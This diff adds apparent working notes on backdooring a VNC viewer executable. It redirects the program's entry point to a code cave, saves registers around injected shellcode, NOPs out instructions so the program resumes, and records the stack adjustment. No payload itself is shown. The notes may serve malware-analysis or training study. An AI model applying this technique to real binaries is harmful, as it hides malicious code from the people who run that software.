@@ -1,0 +1,30 @@
+0045F000 - code cave starts here
+
+0043088C > $ E8 14770000    CALL vncviewe.00437FA5
+00430891   .^E9 16FEFFFF    JMP vncviewe.004306AC
+00430896  /$ 6A 0C          PUSH 0C
+00430898  |. 68 A08A4400    PUSH vncviewe.00448AA0
+0043089D  |. E8 02490000    CALL vncviewe.004351A4
+
+
+
+pushad
+pushfd
+check esp : before shellcode, esp is at 0012FFA0
+
+0045F119   89E0             MOV EAX,ESP
+0045F11B   4E               DEC ESI
+0045F11C   56               PUSH ESI
+
+change DEC ESI to NOP
+change CALL EBP (end of shellcode to NOP)
+
+difference between esp before and after shellcode execution
+
+0012FD9C(esp after)
+
+difference : 12ffA0 - 12fd9c = 204
+popfd
+popad
+call 00437fa5
+jmp 00430891
